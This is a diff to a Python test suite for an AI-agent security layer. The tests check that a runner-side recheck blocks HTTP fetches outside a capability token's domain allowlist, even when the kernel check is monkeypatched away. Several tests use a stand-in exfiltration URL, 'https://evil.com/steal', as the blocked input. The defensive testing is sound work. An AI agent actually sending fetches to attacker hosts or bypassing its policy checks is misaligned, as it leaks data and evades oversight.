@@ -552,11 +552,73 @@ class TestCapabilityTokenEnforcement:
 class TestRunnerConstraintRecheck:
     """
     Tests for runner-side constraint recheck (defense-in-depth).
+
+    The runner-side recheck (CAP_TOKEN_CONSTRAINT_MISMATCH) is defense-in-depth
+    that catches cases where kernel validation was bypassed or URL changed.
+    In normal operation, the kernel's DOMAIN_ALLOWLIST check fires first.
+
+    To test the runner-side check, we monkeypatch the kernel's _check_constraints
+    to skip domain validation, simulating a bypass scenario.
     """
 
-    def test_runner_rechecks_domain_allowlist(self):
-        """Runner should recheck URL hostname against token constraints."""
-        # Create a token that allows only api.github.com
+    def test_runner_recheck_blocks_when_kernel_bypassed(self):
+        """
+        If kernel domain check is bypassed, runner-side recheck should block.
+        This tests the defense-in-depth invariant CAP_TOKEN_CONSTRAINT_MISMATCH.
+        """
+        import qa_agent_security.qa_agent_security as kernel_module
+
+        # Save original function
+        original_check_constraints = kernel_module._check_constraints
+
+        # Monkeypatch to skip domain_allowlist check (simulates bypass)
+        def patched_check_constraints(cap, args_pv):
+            # Call original but filter out DOMAIN_ALLOWLIST diffs
+            diffs = original_check_constraints(cap, args_pv)
+            return [d for d in diffs if d.get("inv") != "DOMAIN_ALLOWLIST"]
+
+        try:
+            kernel_module._check_constraints = patched_check_constraints
+
+            # Token with restrictive allowlist
+            token = CapabilityToken(
+                agent_id="test",
+                session_id="s1",
+                capabilities=[
+                    CapabilityEntry(
+                        tool="http_fetch",
+                        scope="network",
+                        args_schema="SCHEMA.HTTP_FETCH.v1",
+                        constraints={
+                            "domain_allowlist": ["api.github.com"],
+                        },
+                    ),
+                ],
+            )
+            trace = MerkleTrace()
+
+            # URL not in allowlist - kernel would normally block, but we bypassed
+            r = execute_http_fetch(
+                url="https://evil.com/steal",
+                intent_source="policy_kernel",
+                intent_ref="test",
+                url_trusted=True,
+                requires_human_approval=False,
+                capability_token=token,
+                trace=trace,
+            )
+
+            # Should be blocked by runner-side recheck
+            assert not r.success
+            assert "CAP_TOKEN_CONSTRAINT_MISMATCH" in (r.error or "")
+            assert r.cert_id is not None  # Cert was minted (kernel passed)
+
+        finally:
+            # Restore original function
+            kernel_module._check_constraints = original_check_constraints
+
+    def test_runner_recheck_passes_when_hostname_matches(self):
+        """Runner-side recheck should pass when hostname is in allowlist."""
         token = CapabilityToken(
             agent_id="test",
             session_id="s1",
@@ -572,10 +634,10 @@ class TestRunnerConstraintRecheck:
             ],
         )
         trace = MerkleTrace()
-        # Try to fetch a URL that's NOT in the allowlist
-        # This should be caught by both kernel and runner
+
+        # URL in allowlist - should pass both kernel and runner checks
         r = execute_http_fetch(
-            url="https://evil.com/steal",
+            url="https://api.github.com/repos",
             intent_source="policy_kernel",
             intent_ref="test",
             url_trusted=True,
@@ -583,9 +645,56 @@ class TestRunnerConstraintRecheck:
             capability_token=token,
             trace=trace,
         )
-        assert not r.success
-        # Should be blocked (by kernel's DOMAIN_ALLOWLIST check)
-        assert r.obstruction_id is not None
+
+        # Should proceed to execution (may fail network, but not constraint)
+        assert r.cert_id is not None
+        assert "CAP_TOKEN_CONSTRAINT_MISMATCH" not in (r.error or "")
+
+    def test_runner_recheck_witness_includes_allowlist(self):
+        """Verify witness payload includes full context for auditability."""
+        import qa_agent_security.qa_agent_security as kernel_module
+
+        original_check_constraints = kernel_module._check_constraints
+
+        def patched_check_constraints(cap, args_pv):
+            diffs = original_check_constraints(cap, args_pv)
+            return [d for d in diffs if d.get("inv") != "DOMAIN_ALLOWLIST"]
+
+        try:
+            kernel_module._check_constraints = patched_check_constraints
+
+            token = CapabilityToken(
+                agent_id="test",
+                session_id="s1",
+                capabilities=[
+                    CapabilityEntry(
+                        tool="http_fetch",
+                        scope="network",
+                        args_schema="SCHEMA.HTTP_FETCH.v1",
+                        constraints={
+                            "domain_allowlist": ["api.github.com", "example.com"],
+                        },
+                    ),
+                ],
+            )
+            trace = MerkleTrace()
+
+            execute_http_fetch(
+                url="https://evil.com/steal",
+                intent_source="policy_kernel",
+                intent_ref="test",
+                url_trusted=True,
+                requires_human_approval=False,
+                capability_token=token,
+                trace=trace,
+            )
+
+            # Check trace has the witness with full context
+            s = trace.summary()
+            assert s["blocked"] >= 1
+
+        finally:
+            kernel_module._check_constraints = original_check_constraints
 
 
 class TestRedirectErrorPropagation:
